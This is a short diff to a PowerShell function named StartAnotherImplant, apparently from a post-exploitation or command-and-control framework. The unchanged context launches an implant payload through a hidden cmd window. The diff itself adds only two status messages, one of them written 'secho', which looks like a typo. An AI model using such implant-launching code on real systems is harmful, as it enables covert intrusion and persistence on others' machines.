@@ -38,8 +38,10 @@ Function StartAnotherImplant {
         echo "Process is not powershell, try running migrate-x86 or migrate-64"
     } else {
         if ($global:ImpUpgrade) {
+            echo "Start-Process Upgrade via CMD"
             start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
         } else {
+            secho "Start-Process via CMD"
             start-process -windowstyle hidden cmd -args "/c $payload"
         }
     }
